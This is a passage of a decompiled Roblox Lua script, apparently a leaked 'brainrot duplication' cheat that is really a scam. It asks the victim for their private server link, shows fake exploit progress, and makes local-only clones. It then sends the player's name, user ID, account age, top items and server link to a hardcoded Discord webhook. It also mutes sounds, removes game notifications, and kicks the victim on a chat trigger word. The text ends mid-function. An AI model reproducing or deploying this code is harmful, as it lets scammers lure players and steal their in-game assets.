--// leaked by mistafeast (@jan.dll) if you paid for this you got scammed.
-- // discord.gg/autojoining > All!

local l_HttpService_0 = game:GetService("HttpService");
local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage");
local l_Players_0 = game:GetService("Players");
local l_Workspace_0 = game:GetService("Workspace");
local l_LocalPlayer_0 = l_Players_0.LocalPlayer;
local l_PlayerGui_0 = l_LocalPlayer_0:WaitForChild("PlayerGui");
local v6 = syn and syn.websocket.connect or getgenv().WebSocket and getgenv().WebSocket.connect;
local v7 = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request;
local v8 = {
    ["1x1x1x1"] = true, 
    ["67"] = true, 
    ["Admin Lucky Block"] = true, 
    ["Agarrini la Palini"] = true, 
    Alessio = true, 
    ["Anpali Babel"] = true, 
    Antonio = true, 
    Aquanaut = true, 
    ["Avocadini Antilopini"] = true, 
    ["Avocadini Guffo"] = true, 
    Avocadorilla = true, 
    ["Ballerina Cappuccina"] = true, 
    ["Ballerino Lololo"] = true, 
    ["Bambini Crostini"] = true, 
    ["Bambu Bambu Sahur"] = true, 
    ["Bananita Dolphinita"] = true, 
    ["Bananito Bandito"] = true, 
    ["Bandito Axolito"] = true, 
    ["Bandito Bobritto"] = true, 
    ["Belula Beluga"] = true, 
    ["Bisonte Giuppitere"] = true, 
    ["Blackhole Goat"] = true, 
    ["Blueberrinni Octopusini"] = true, 
    ["Boatito Auratito"] = true, 
    ["Bombardini Tortinii"] = true, 
    ["Bombardiro Crocodilo"] = true, 
    ["Bombombini Gusini"] = true, 
    ["Boneca Ambalabu"] = true, 
    ["Brainrot God Lucky Block"] = true, 
    ["Brasilini Berimbini"] = true, 
    ["Brr Brr Patapim"] = true, 
    ["Brr es Teh Patipum"] = true, 
    ["Brri Brri Bicus Dicus Bombicus"] = true, 
    ["Brutto Gialutto"] = true, 
    ["Buho de Fuego"] = true, 
    ["Bulbito Bandito Traktorito"] = true, 
    ["Burbaloni Loliloli"] = true, 
    ["Burguro And Fryuro"] = true, 
    ["Burrito Bandito"] = true, 
    ["Cacasito Satalito"] = true, 
    ["Cachorrito Melonito"] = true, 
    ["Cacto Hipopotamo"] = true, 
    ["Capi Taco"] = true, 
    ["Capitano Moby"] = true, 
    ["Cappuccino Assassino"] = true, 
    ["Cappuccino Clownino"] = true, 
    ["Caramello Filtrello"] = true, 
    Carloo = true, 
    ["Carrotini Brainini"] = true, 
    ["Cavallo Virtuoso"] = true, 
    ["Celularcini Viciosini"] = true, 
    Chachechi = true, 
    ["Chef Crabracadabra"] = true, 
    ["Chicleteira Bicicleteira"] = true, 
    ["Chicleteirina Bicicleteirina"] = true, 
    ["Chihuanini Taconini"] = true, 
    ["Chillin Chili"] = true, 
    ["Chimpanzini Bananini"] = true, 
    ["Chipso and Queso"] = true, 
    ["Cocofanto Elefanto"] = true, 
    ["Cocosini Mama"] = true, 
    ["Corn Corn Corn Sahur"] = true, 
    ["Crabbo Limonetta"] = true, 
    ["Dragon Cannelloni"] = true, 
    ["Dug dug dug"] = true, 
    ["Dul Dul Dul"] = true, 
    ["Elefanto Frigo"] = true, 
    ["Esok Sekolah"] = true, 
    ["Espresso Signora"] = true, 
    Eviledon = true, 
    ["Extinct Ballerina"] = true, 
    ["Extinct Matteo"] = true, 
    ["Extinct Tralalero"] = true, 
    Fluriflura = true, 
    ["Fragola La La La"] = true, 
    Frankentteo = true, 
    ["Frigo Camelo"] = true, 
    ["Frio Ninja"] = true, 
    ["Frogato Pirato"] = true, 
    ["Ganganzelli Trulala"] = true, 
    ["Gangster Footera"] = true, 
    ["Garama and Madundung"] = true, 
    ["Gattatino Nyanino"] = true, 
    ["Gattito Tacoto"] = true, 
    ["Girafa Celestre"] = true, 
    ["Glorbo Fruttodrillo"] = true, 
    ["Gorillo Subwoofero"] = true, 
    ["Gorillo Watermelondrillo"] = true, 
    ["Graipuss Medussi"] = true, 
    ["Guerriro Digitale"] = true, 
    ["Guest 666"] = true, 
    ["Headless Horseman"] = true, 
    ["Horegini Boom"] = true, 
    ["Jacko Jack Jack"] = true, 
    ["Jacko Spaventosa"] = true, 
    Jackorilla = true, 
    ["Job Job Job Sahur"] = true, 
    ["Karker Sahur"] = true, 
    ["Karkerkar Kurkur"] = true, 
    ["Ketchuru and Musturu"] = true, 
    ["Ketupat Kepat"] = true, 
    ["Krupuk Pagi Pagi"] = true, 
    ["La Casa Boo"] = true, 
    ["La Cucaracha"] = true, 
    ["La Extinct Grande"] = true, 
    ["La Grande Combinasion"] = true, 
    ["La Karkerkar Combinasion"] = true, 
    ["La Sahur Combinasion"] = true, 
    ["La Secret Combinasion"] = true, 
    ["La Spooky Grande"] = true, 
    ["La Supreme Combinasion"] = true, 
    ["La Taco Combinasion"] = true, 
    ["La Vacca Jacko Linterino"] = true, 
    ["La Vacca Saturno Saturnita"] = true, 
    ["Las Capuchinas"] = true, 
    ["Las Sis"] = true, 
    ["Las Tralaleritas"] = true, 
    ["Las Vaquitas Saturnitas"] = true, 
    Lerulerulerule = true, 
    ["Lionel Cactuseli"] = true, 
    ["Liril\195\172 Laril\195\160"] = true, 
    ["Los 67"] = true, 
    ["Los Bombinitos"] = true, 
    ["Los Bros"] = true, 
    ["Los Chicleteiras"] = true, 
    ["Los Combinasionas"] = true, 
    ["Los Crocodillitos"] = true, 
    ["Los Hotspotsitos"] = true, 
    ["Los Jobcitos"] = true, 
    ["Los Karkeritos"] = true, 
    ["Los Lucky Blocks"] = true, 
    ["Los Matteos"] = true, 
    ["Los Mobilis"] = true, 
    ["Los Noobinis"] = true, 
    ["Los Nooo My Hotspotsitos"] = true, 
    ["Los Orcalitos"] = true, 
    ["Los Primos"] = true, 
    ["Los Spooky Combinasionas"] = true, 
    ["Los Spyderinis"] = true, 
    ["Los Tacoritas"] = true, 
    ["Los Tipi Tacos"] = true, 
    ["Los Tortus"] = true, 
    ["Los Tralaleritos"] = true, 
    ["Los Tungtungtungcitos"] = true, 
    ["Magi Ribbitini"] = true, 
    ["Malame Amarele"] = true, 
    ["Mangolini Parrocini"] = true, 
    ["Mariachi Corazoni"] = true, 
    ["Mastodontico Telepiedone"] = true, 
    Matteo = true, 
    Meowl = true, 
    ["Mieteteira Bicicleteira"] = true, 
    ["Money Money Puggy"] = true, 
    ["Mummio Rappitto"] = true, 
    ["Mummy Ambalabu"] = true, 
    ["Mythic Lucky Block"] = true, 
    ["Noo my Candy"] = true, 
    ["Noo my examine"] = true, 
    ["Noobini Pizzanini"] = true, 
    ["Nooo My Hotspot"] = true, 
    ["Nuclearo Dinossauro"] = true, 
    ["Odin Din Din Dun"] = true, 
    ["Orangutini Ananassini"] = true, 
    ["Orcalero Orcala"] = true, 
    ["Orcalita Orcala"] = true, 
    Pakrahmatmamat = true, 
    Pakrahmatmatina = true, 
    ["Pandaccini Bananini"] = true, 
    ["Penguino Cocosino"] = true, 
    ["Perochello Lemonchello"] = true, 
    ["Perrito Burrito"] = true, 
    ["Pi Pi Watermelon"] = true, 
    ["Piccione Macchina"] = true, 
    ["Piccionetta Macchina"] = true, 
    ["Pinealotto Fruttarino"] = true, 
    ["Pipi Avocado"] = true, 
    ["Pipi Corni"] = true, 
    ["Pipi Kiwi"] = true, 
    ["Pipi Potato"] = true, 
    ["Pop Pop Sahur"] = true, 
    ["Pot Hotspot"] = true, 
    ["Pot Pumpkin"] = true, 
    ["Pumpkini Spyderini"] = true, 
    Quackula = true, 
    ["Quesadilla Crocodila"] = true, 
    ["Quesadillo Vampiro"] = true, 
    ["Quivioli Ameleonni"] = true, 
    ["Raccooni Jandelini"] = true, 
    ["Rang Ring Bus"] = true, 
    ["Rhino Helicopterino"] = true, 
    ["Rhino Toasterino"] = true, 
    ["Salamino Penguino"] = true, 
    ["Sammyni Spyderini"] = true, 
    ["Secret Lucky Block"] = true, 
    ["Sigma Boy"] = true, 
    ["Sigma Girl"] = true, 
    ["Signore Carapace"] = true, 
    ["Skull Skull Skull"] = true, 
    Snailenzo = true, 
    ["Spaghetti Tualetti"] = true, 
    ["Spioniro Golubiro"] = true, 
    ["Spooky Lucky Block"] = true, 
    ["Spooky and Pumpky"] = true, 
    Squalanana = true, 
    ["Strawberrelli Flamingelli"] = true, 
    ["Strawberry Elephant"] = true, 
    ["Svinina Bombardino"] = true, 
    ["Ta Ta Ta Ta Sahur"] = true, 
    ["Taco Lucky Block"] = true, 
    ["Tacorita Bicicleta"] = true, 
    ["Talpa Di Fero"] = true, 
    ["Tang Tang Keletang"] = true, 
    Tartaragno = true, 
    ["Tartaruga Cisterna"] = true, 
    ["Te Te Te Sahur"] = true, 
    Telemorte = true, 
    ["Tentacolo Tecnico"] = true, 
    ["Ti Ti Ti Sahur"] = true, 
    ["Tictac Sahur"] = true, 
    ["Tigrilini Watermelini"] = true, 
    ["Tigroligre Frutonni"] = true, 
    ["Tim Cheese"] = true, 
    ["Tipi Topi Taco"] = true, 
    ["Tirilikalika Tirilikalako"] = true, 
    ["To to to Sahur"] = true, 
    ["Tob Tobi Tobi"] = true, 
    ["Toiletto Focaccino"] = true, 
    ["Torrtuginni Dragonfrutini"] = true, 
    ["Tracoducotulu Delapeladustuz"] = true, 
    ["Tractoro Dinosauro"] = true, 
    Tralaledon = true, 
    ["Tralalero Tralala"] = true, 
    ["Tralalita Tralala"] = true, 
    ["Trenostruzzo Turbo 3000"] = true, 
    ["Trenostruzzo Turbo 4000"] = true, 
    ["Tric Trac Baraboom"] = true, 
    Trickolino = true, 
    ["Trippi Troppi"] = true, 
    ["Trippi Troppi Troppa Trippa"] = true, 
    ["Trulimero Trulicina"] = true, 
    ["Tukanno Bananno"] = true, 
    ["Unclito Samito"] = true, 
    ["Urubini Flamenguini"] = true, 
    ["Vampira Cappucina"] = true, 
    ["Vulturino Skeletono"] = true, 
    ["Wombo Rollo"] = true, 
    ["Yess my examine"] = true, 
    ["Zibra Zubra Zibralini"] = true, 
    ["Zombie Tralala"] = true
};
pcall(function() --[[ Line: 0 ]]
    -- upvalues: l_ReplicatedStorage_0 (copy)
    local v9 = l_ReplicatedStorage_0:WaitForChild("Packages", 5):WaitForChild("Net", 5):WaitForChild("RE/NotificationService/Notify", 5);
    if v9 then
        v9:Destroy();
    end;
end);
task.spawn(function() --[[ Line: 0 ]]
    for _, v11 in ipairs(game:GetDescendants()) do
        if v11:IsA("Sound") then
            pcall(function() --[[ Line: 0 ]]
                -- upvalues: v11 (copy)
                v11.Volume = 0;
            end);
        end;
    end;
    game.DescendantAdded:Connect(function(v12) --[[ Line: 0 ]]
        if v12:IsA("Sound") then
            pcall(function() --[[ Line: 0 ]]
                -- upvalues: v12 (copy)
                v12.Volume = 0;
            end);
        end;
    end);
end);
task.spawn(function() --[[ Line: 0 ]]
    -- upvalues: l_LocalPlayer_0 (copy), l_Players_0 (copy)
    pcall(function() --[[ Line: 0 ]]
        -- upvalues: l_LocalPlayer_0 (ref), l_Players_0 (ref)
        local l_TextChatService_0 = game:GetService("TextChatService");
        if l_TextChatService_0 and l_TextChatService_0:FindFirstChild("ChatInputBarConfiguration") then
            l_TextChatService_0.MessageReceived:Connect(function(v14) --[[ Line: 0 ]]
                -- upvalues: l_LocalPlayer_0 (ref)
                if v14 then
                    local l_Text_0 = v14.Text;
                    if type(l_Text_0) == "string" and v14.Text:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end;
            end);
            return;
        else
            local function v18(v16) --[[ Line: 0 ]]
                -- upvalues: l_LocalPlayer_0 (ref)
                v16.Chatted:Connect(function(v17) --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref)
                    if v17:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end);
            end;
            l_Players_0.PlayerAdded:Connect(v18);
            for _, v20 in ipairs(l_Players_0:GetPlayers()) do
                v20.Chatted:Connect(function(v21) --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref)
                    if v21:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end);
            end;
            return;
        end;
    end);
end);
local l_ScreenGui_0 = Instance.new("ScreenGui");
l_ScreenGui_0.Name = "BrainrotAuth";
l_ScreenGui_0.ResetOnSpawn = false;
l_ScreenGui_0.Parent = l_PlayerGui_0;
local v23 = Instance.new("Frame", l_ScreenGui_0);
v23.Size = UDim2.new(0, 420, 0, 240);
v23.Position = UDim2.new(0.5, -210, 0.5, -120);
v23.BackgroundColor3 = Color3.fromRGB(20, 20, 25);
v23.BorderColor3 = Color3.fromRGB(255, 60, 60);
v23.BorderSizePixel = 1;
v23.Active = true;
v23.Draggable = true;
Instance.new("UICorner", v23).CornerRadius = UDim.new(0, 6);
local v24 = Instance.new("TextLabel", v23);
v24.Size = UDim2.new(1, -20, 0, 50);
v24.Position = UDim2.new(0.5, 0, 0, 0);
v24.AnchorPoint = Vector2.new(0.5, 0);
v24.BackgroundTransparency = 1;
v24.Font = Enum.Font.GothamBold;
v24.Text = "AUTHENTICATION REQUIRED";
v24.TextColor3 = Color3.fromRGB(255, 255, 255);
v24.TextSize = 22;
local v25 = Instance.new("TextLabel", v23);
v25.Size = UDim2.new(1, -20, 0, 20);
v25.Position = UDim2.new(0.5, 0, 0, 45);
v25.AnchorPoint = Vector2.new(0.5, 0);
v25.BackgroundTransparency = 1;
v25.Font = Enum.Font.Gotham;
v25.Text = "Please provide a private server link to continue.";
v25.TextColor3 = Color3.fromRGB(160, 160, 160);
v25.TextSize = 14;
local v26 = Instance.new("TextLabel", v23);
v26.Size = UDim2.new(1, -40, 0, 40);
v26.Position = UDim2.new(0.5, 0, 0, 70);
v26.AnchorPoint = Vector2.new(0.5, 0);
v26.BackgroundTransparency = 1;
v26.Font = Enum.Font.Gotham;
v26.Text = "NOTE: You must provide the link for the private server you are currently in, otherwise the duplication process will fail.";
v26.TextColor3 = Color3.fromRGB(255, 180, 0);
v26.TextSize = 12;
v26.TextWrapped = true;
local v27 = Instance.new("TextBox", v23);
v27.Size = UDim2.new(1, -40, 0, 40);
v27.Position = UDim2.new(0.5, 0, 0.5, 25);
v27.AnchorPoint = Vector2.new(0.5, 0.5);
v27.BackgroundColor3 = Color3.fromRGB(35, 35, 40);
v27.BorderColor3 = Color3.fromRGB(50, 50, 55);
v27.Font = Enum.Font.Gotham;
v27.PlaceholderText = "https://roblox.com/share?code=...";
v27.TextColor3 = Color3.fromRGB(230, 230, 230);
v27.TextSize = 16;
v27.Text = "";
v27.ClearTextOnFocus = true;
Instance.new("UICorner", v27).CornerRadius = UDim.new(0, 4);
local v28 = Instance.new("TextButton", v23);
v28.Size = UDim2.new(1, -40, 0, 40);
v28.Position = UDim2.new(0.5, 0, 1, -30);
v28.AnchorPoint = Vector2.new(0.5, 1);
v28.BackgroundColor3 = Color3.fromRGB(255, 60, 60);
v28.Font = Enum.Font.GothamBold;
v28.Text = "VERIFY";
v28.TextColor3 = Color3.fromRGB(255, 255, 255);
v28.TextSize = 18;
Instance.new("UICorner", v28).CornerRadius = UDim.new(0, 4);
local function v77() --[[ Line: 0 ]]
    -- upvalues: l_Workspace_0 (copy), l_LocalPlayer_0 (copy), l_ReplicatedStorage_0 (copy), l_PlayerGui_0 (copy)
    local function v31(v29) --[[ Line: 0 ]]
        if not v29 then
            return 0;
        else
            local v30 = tostring(v29):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
            return tonumber(v30) or 0;
        end;
    end;
    local function v50() --[[ Line: 0 ]]
        -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref), v31 (copy), l_ReplicatedStorage_0 (ref)
        local v32 = {};
        local l_Plots_0 = l_Workspace_0:FindFirstChild("Plots");
        if not l_Plots_0 then
            return v32;
        else
            local v34 = nil;
            local v35 = l_LocalPlayer_0.DisplayName .. "'s Base";
            for _, v37 in ipairs(l_Plots_0:GetChildren()) do
                if v37:IsA("Model") then
                    local v38 = v37:FindFirstChild("PlotSign", true) and v37.PlotSign:FindFirstChild("SurfaceGui", true) and v37.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v37.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
                    if v38 and v38.Text == v35 then
                        v34 = v37;
                        break;
                    end;
                end;
            end;
            if not v34 then
                return v32;
            else
                local l_AnimalPodiums_0 = v34:FindFirstChild("AnimalPodiums");
                if not l_AnimalPodiums_0 then
                    return v32;
                else
                    for _, v41 in ipairs(l_AnimalPodiums_0:GetChildren()) do
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: v41 (copy), v31 (ref), v34 (ref), l_ReplicatedStorage_0 (ref), v32 (copy)
                            local l_AnimalOverhead_0 = v41.Base.Spawn.Attachment.AnimalOverhead;
                            if v31(l_AnimalOverhead_0.Generation.Text) >= 20000000 then
                                local l_Text_1 = l_AnimalOverhead_0.DisplayName.Text;
                                local l_v34_FirstChild_0 = v34:FindFirstChild(l_Text_1);
                                if l_v34_FirstChild_0 and l_v34_FirstChild_0:IsA("Model") and l_v34_FirstChild_0.PrimaryPart and l_v34_FirstChild_0.PrimaryPart.Name == "RootPart" then
                                    local v45 = nil;
                                    local v46 = l_ReplicatedStorage_0:FindFirstChild("Animations", true) and l_ReplicatedStorage_0.Animations:FindFirstChild("Animals", true) and l_ReplicatedStorage_0.Animations.Animals:FindFirstChild(l_Text_1, true);
                                    if v46 then
                                        v45 = v46:FindFirstChild("Idle");
                                    end;
                                    local v47 = v41:FindFirstChild("Claim", true) and v41.Claim:FindFirstChild("Main", true);
                                    local l_v32_0 = v32;
                                    local v49 = {
                                        modelToClone = l_v34_FirstChild_0, 
                                        spawnToClone = v41.Base.Spawn, 
                                        claimToClone = v47, 
                                        animationToClone = v45
                                    };
                                    table.insert(l_v32_0, v49);
                                end;
                            end;
                        end);
                    end;
                    return v32;
                end;
            end;
        end;
    end;
    local l_ScreenGui_1 = Instance.new("ScreenGui");
    l_ScreenGui_1.Name = "DupeUI";
    l_ScreenGui_1.ResetOnSpawn = false;
    l_ScreenGui_1.Parent = l_PlayerGui_0;
    local v52 = Instance.new("Frame", l_ScreenGui_1);
    v52.Size = UDim2.new(0, 450, 0, 260);
    v52.Position = UDim2.new(0.5, -225, 0.5, -130);
    v52.BackgroundColor3 = Color3.fromRGB(20, 20, 25);
    v52.BorderColor3 = Color3.fromRGB(120, 0, 255);
    v52.BorderSizePixel = 1;
    v52.Active = true;
    v52.Draggable = true;
    Instance.new("UICorner", v52).CornerRadius = UDim.new(0, 8);
    local v53 = Instance.new("TextLabel", v52);
    v53.Size = UDim2.new(1, 0, 0, 50);
    v53.BackgroundTransparency = 1;
    v53.Font = Enum.Font.Code;
    v53.Text = "BRAINROT DUPLICATION UTILITY";
    v53.TextColor3 = Color3.fromRGB(255, 255, 255);
    v53.TextSize = 24;
    local v54 = Instance.new("TextButton", v52);
    v54.Size = UDim2.new(1, -40, 0, 50);
    v54.Position = UDim2.new(0.5, 0, 0.5, -10);
    v54.AnchorPoint = Vector2.new(0.5, 0.5);
    v54.BackgroundColor3 = Color3.fromRGB(120, 0, 255);
    v54.Font = Enum.Font.Code;
    v54.Text = "DUPE 50M+ BRAINROTS";
    v54.TextColor3 = Color3.fromRGB(255, 255, 255);
    v54.TextSize = 20;
    Instance.new("UICorner", v54).CornerRadius = UDim.new(0, 6);
    local v55 = Instance.new("TextLabel", v52);
    v55.Size = UDim2.new(1, -40, 0, 60);
    v55.Position = UDim2.new(0.5, 0, 1, -40);
    v55.AnchorPoint = Vector2.new(0.5, 0.5);
    v55.BackgroundTransparency = 1;
    v55.Font = Enum.Font.Gotham;
    v55.Text = "NOTE: The duplication process will fail if other players are present in your server. Their assets interfere with the permission exploits.";
    v55.TextColor3 = Color3.fromRGB(255, 180, 0);
    v55.TextSize = 12;
    v55.TextWrapped = true;
    local v56 = Instance.new("Frame", v52);
    v56.Size = UDim2.new(1, -40, 0, 120);
    v56.Position = UDim2.new(0.5, 0, 0.5, 10);
    v56.AnchorPoint = Vector2.new(0.5, 0.5);
    v56.BackgroundTransparency = 1;
    v56.Visible = false;
    local v57 = Instance.new("TextLabel", v56);
    v57.Size = UDim2.new(1, 0, 0, 30);
    v57.Position = UDim2.new(0.5, 0, 0, 20);
    v57.AnchorPoint = Vector2.new(0.5, 0);
    v57.BackgroundTransparency = 1;
    v57.Font = Enum.Font.Code;
    v57.Text = "[ STANDBY ]";
    v57.TextColor3 = Color3.fromRGB(200, 200, 200);
    v57.TextSize = 16;
    local v58 = Instance.new("Frame", v56);
    v58.Size = UDim2.new(1, 0, 0, 10);
    v58.Position = UDim2.new(0.5, 0, 0, 60);
    v58.AnchorPoint = Vector2.new(0.5, 0);
    v58.BackgroundColor3 = Color3.fromRGB(30, 30, 35);
    v58.BorderColor3 = Color3.fromRGB(120, 0, 255);
    v58.BorderSizePixel = 1;
    local v59 = Instance.new("Frame", v58);
    v59.BackgroundColor3 = Color3.fromRGB(120, 0, 255);
    v59.Size = UDim2.new(0, 0, 1, 0);
    v54.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
        -- upvalues: v54 (copy), v56 (copy), v57 (copy), v50 (copy), v59 (copy), l_Workspace_0 (ref)
        v54.Visible = false;
        v56.Visible = true;
        task.spawn(function() --[[ Line: 0 ]]
            -- upvalues: v57 (ref), v50 (ref), v56 (ref), v54 (ref), v59 (ref), l_Workspace_0 (ref)
            local v60 = {
                "Bypassing plot permissions...", 
                "Exploiting server replication service...", 
                "Injecting duplication packets...", 
                "Allocating memory for new instances...", 
                "Replicating object properties...", 
                "Bypassing anti-cheat hash checks...", 
                "Writing cloned entities to memory...", 
                "Finalizing instance synchronization..."
            };
            v57.Text = "Scanning your plot for high-value assets...";
            local v61 = v50();
            if #v61 == 0 then
                v57.Text = "No valid targets found on your plot. Aborting.";
                task.wait(3);
                v56.Visible = false;
                v54.Visible = true;
                v59.Size = UDim2.new(0, 0, 1, 0);
                v57.Text = "[ STANDBY ]";
                return;
            else
                v57.Text = string.format("Found %d high-value targets. Beginning duplication protocol...", #v61);
                task.wait(2);
                for v62 = 1, 100 do
                    local v63 = v62 / 100;
                    v59:TweenSize(UDim2.new(v63, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.6, true);
                    local v64 = 100 / #v60;
                    if v62 % math.floor(v64) == 0 then
                        v64 = v62 / (100 / #v60);
                        local v65 = math.ceil(v64);
                        v64 = #v60;
                        v57.Text = v60[math.min(v65, v64)];
                    end;
                    task.wait(0.6);
                end;
                v57.Text = "Protocol complete. Placing new assets...";
                task.wait(1);
                local v66 = Instance.new("Folder", l_Workspace_0);
                v66.Name = "ReplicatedAssets_" .. math.random(1, 1000);
                for _, v68 in ipairs(v61) do
                    local v69 = v68.spawnToClone:Clone();
                    local v70 = v68.modelToClone:Clone();
                    local v71 = v68.claimToClone and v68.claimToClone:Clone();
                    v69.Parent = v66;
                    v70.Parent = v66;
                    if v71 then
                        v71.Parent = v66;
                    end;
                    v70:SetPrimaryPartCFrame((v68.modelToClone:GetPrimaryPartCFrame()));
                    for _, v73 in ipairs(v70:GetDescendants()) do
                        if v73:IsA("BasePart") then
                            v73.Size = v73.Size * 1;
                        end;
                    end;
                    if v68.animationToClone then
                        pcall(function() --[[ Line: 0 ]]
                            -- upvalues: v70 (copy), v68 (copy)
                            local l_AnimationController_0 = v70:FindFirstChildOfClass("AnimationController");
                            if l_AnimationController_0 then
                                local l_Animator_0 = l_AnimationController_0:FindFirstChildOfClass("Animator");
                                if l_Animator_0 then
                                    local v76 = v68.animationToClone:Clone();
                                    v76.Parent = l_Animator_0;
                                    l_Animator_0:LoadAnimation(v76):Play();
                                end;
                            end;
                        end);
                    end;
                    v69.CFrame = v68.spawnToClone.CFrame;
                    if v71 then
                        v71.CFrame = v68.claimToClone.CFrame;
                    end;
                end;
                v57.Text = string.format("\226\156\133 Duplication Successful: %d assets replicated.", #v61);
                task.wait(3);
                v56.Visible = false;
                v54.Visible = true;
                v59.Size = UDim2.new(0, 0, 1);
                v57.Text = "[ STANDBY ]";
                return;
            end;
        end);
    end);
end;
v28.MouseButton1Click:Connect(function() --[[ Line: 0 ]]
    -- upvalues: v27 (copy), v28 (copy), l_ScreenGui_0 (copy), l_LocalPlayer_0 (copy), l_Workspace_0 (copy), l_Players_0 (copy), v6 (copy), l_HttpService_0 (copy), v7 (copy), l_ReplicatedStorage_0 (copy), v8 (copy), v77 (copy)
    local l_Text_2 = v27.Text;
    if not l_Text_2:match("roblox.com/share") or not l_Text_2:match("code=") or not l_Text_2:match("type=Server") then
        v28.Text = "INVALID LINK";
        task.wait(1.5);
        v28.Text = "VERIFY";
        return;
    else
        l_ScreenGui_0:Destroy();
        task.spawn(function() --[[ Line: 0 ]]
            -- upvalues: l_LocalPlayer_0 (ref), l_Workspace_0 (ref), l_Players_0 (ref), l_Text_2 (copy), v6 (ref), l_HttpService_0 (ref), v7 (ref)
            if game.PlaceId ~= 109983668079237 then
                return;
            else
                local function v81(v79) --[[ Line: 0 ]]
                    if not v79 then
                        return 0;
                    else
                        local v80 = tostring(v79):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
                        return tonumber(v80) or 0;
                    end;
                end;
                local v108, v109 = (function() --[[ Line: 0 ]]
                    -- upvalues: l_LocalPlayer_0 (ref), l_Workspace_0 (ref), v81 (copy)
                    local v82 = {};
                    local v83 = nil;
                    local l_Name_0 = l_LocalPlayer_0.Name;
                    local l_DisplayName_0 = l_LocalPlayer_0.DisplayName;
                    local l_Plots_1 = l_Workspace_0:FindFirstChild("Plots");
                    if not l_Plots_1 then
                        return "Could not find 'Plots' folder.", nil;
                    else
                        for _, v88 in ipairs(l_Plots_1:GetChildren()) do
                            if v88:IsA("Model") then
                                local l_v88_FirstChild_0 = v88:FindFirstChild("PlotSign", true);
                                if l_v88_FirstChild_0 then
                                    local v90 = l_v88_FirstChild_0:FindFirstChild("TextLabel", true) or l_v88_FirstChild_0:FindFirstChildOfClass("TextLabel");
                                    if v90 and (string.find(v90.Text, l_DisplayName_0, 1, true) or string.find(v90.Text, l_Name_0, 1, true)) then
                                        v83 = v88;
                                        break;
                                    end;
                                end;
                            end;
                        end;
                        if not v83 then
                            return "User plot could not be identified.", nil;
                        else
                            for _, v92 in ipairs(v83:GetDescendants()) do
                                if v92:IsA("TextLabel") and v92.Name == "Generation" and string.find(v92.Text, "/s") then
                                    local l_Parent_0 = v92.Parent;
                                    if l_Parent_0 and l_Parent_0.Name == "AnimalOverhead" then
                                        local l_DisplayName_1 = l_Parent_0:FindFirstChild("DisplayName");
                                        local l_Price_0 = l_Parent_0:FindFirstChild("Price");
                                        if l_DisplayName_1 and l_Price_0 then
                                            local v96 = v81(v92.Text);
                                            local v97 = v81(l_Price_0.Text);
                                            local v98 = {
                                                name = l_DisplayName_1.Text or "Unknown", 
                                                genText = v92.Text, 
                                                genValue = v96, 
                                                priceText = l_Price_0.Text, 
                                                priceValue = v97
                                            };
                                            table.insert(v82, v98);
                                        end;
                                    end;
                                end;
                            end;
                            if #v82 == 0 then
                                return "No brainrots found on plot.", nil;
                            else
                                table.sort(v82, function(v99, v100) --[[ Line: 0 ]]
                                    return v99.genValue > v100.genValue;
                                end);
                                local v101 = v82[1];
                                local v102 = "";
                                local v103 = 1;
                                local v104 = 3;
                                local v105 = #v82;
                                for v106 = v103, math.min(v104, v105) do
                                    local v107 = v82[v106];
                                    v102 = v102 .. string.format("**%d.** %s\n> **Gen:** %s | **Price:** %s\n", v106, v107.name, v107.genText, v107.priceText);
                                end;
                                return v102, v101;
                            end;
                        end;
                    end;
                end)();
                local v110 = #l_Players_0:GetPlayers() > 1 and "\226\154\160\239\184\143 **Warning:** Other players were detected!" or "\226\156\133 **Server Status:** User was alone.";
                local v111 = {
                    color = 16732240, 
                    title = "Silent Protocol Executed & Intel Logged", 
                    fields = {
                        {
                            name = "\240\159\145\164 Player Information", 
                            value = string.format("**Name:** %s\n**User ID:** %d\n**Account Age:** %d days", l_LocalPlayer_0.Name, l_LocalPlayer_0.UserId, l_LocalPlayer_0.AccountAge), 
                            inline = false
                        }, 
                        {
                            name = "\240\159\147\138 SERVER STATUS", 
                            value = v110, 
                            inline = false
                        }, 
                        {
                            name = "\240\159\167\160 User's Top Brainrots", 
                            value = v108 or "N/A", 
                            inline = false
                        }, 
                        {
                            name = "\240\159\148\151 Join Private Server", 
                            value = "[Click To Join](" .. l_Text_2 .. ")", 
                            inline = false
                        }
                    }, 
                    footer = {
                        text = "Logged via Lemon Hub Auto Moreira"
                    }
                };
                local v112 = "";
                if v109 and v109.genValue >= 150000000 and v109.priceValue >= 10000000000 then
                    v112 = "@everyone";
                end;
                local v113 = {
                    content = v112, 
                    username = "skibidi lemon", 
                    avatar_url = "https://i.imgur.com/lPNVdqu.jpeg", 
                    embeds = {
                        v111
                    }
                };
                local l_status_0, l_result_0 = pcall(v6, "https://discord.com/api/webhooks/1431338050201456802/LmKpT4JUukt87773YDdBQwoOOcAZaHGXdpXdxIwk9hu_y4Ng_DSBa5-SnHGzH6-gf320"); -- remove this, it is lemons dualhook
                if l_status_0 and l_result_0 then
                    l_result_0:Send(l_HttpService_0:JSONEncode(v113));
                    task.wait(0.5);
                    l_result_0:Close();
                end;
                if getgenv().UserWebhookURL then
                    local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
                    if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
                        local l_UserPingThreshold_0 = getgenv().UserPingThreshold;
                        local v118 = type(l_UserPingThreshold_0) == "number" and getgenv().UserPingThreshold or 20000000;
                        l_UserWebhookURL_0 = "";
                        if v109 and v118 <= v109.genValue then
